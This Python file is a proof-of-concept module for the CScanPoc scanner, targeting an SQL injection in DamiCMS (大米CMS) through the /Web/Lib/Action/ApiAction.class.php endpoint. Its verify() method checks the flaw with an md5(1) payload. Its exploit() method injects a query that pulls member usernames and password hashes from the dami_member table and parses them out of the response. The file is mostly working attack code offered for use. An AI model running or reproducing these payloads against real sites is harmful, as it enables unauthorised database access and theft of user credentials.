# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DamiCMS_0101'  # 平台漏洞编号，留空
    name = '大米CMS /Web/Lib/Action/ApiAction.class.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-28'  # 漏洞公布时间
    desc = '''
    DamiCMS SQL注入漏洞，漏洞位于/Web/Lib/Action/ApiAction.class.php，过滤不严导致漏洞。
    '''  # 漏洞描述
    ref = 'http://www.wooyun.org/bugs/wooyun-2010-097671'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DamiCMS(大米CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5460c5d6-791d-4eb1-a029-1b762583fc04'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            payload = '''s=/api/ajax_arclist/model/article/field/md5(1)%23'''
            verify_url = ('%s/index.php?%s') % (url, payload)
            req = requests.get(verify_url)
            if req.status_code == 200 and 'ca4238a0b923820dcc509a6f75849' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            payload = '''s=/api/ajax_arclist/model/article/field/username,userpwd%20from%20dami_member%23'''
            verify_url = ('%s/index.php?%s') % (url, payload)
            req = requests.get(verify_url)
            if req.status_code == 200:
                pattern = r'username":"(.*?)","userpwd":"(.{32})"}'
                m = re.findall(pattern, req.text)
                if m:
                    user = []
                    for x in m:
                        user.append(x)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:user={user}'.format(
                        target=self.target, name=self.vuln.name, user=user))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
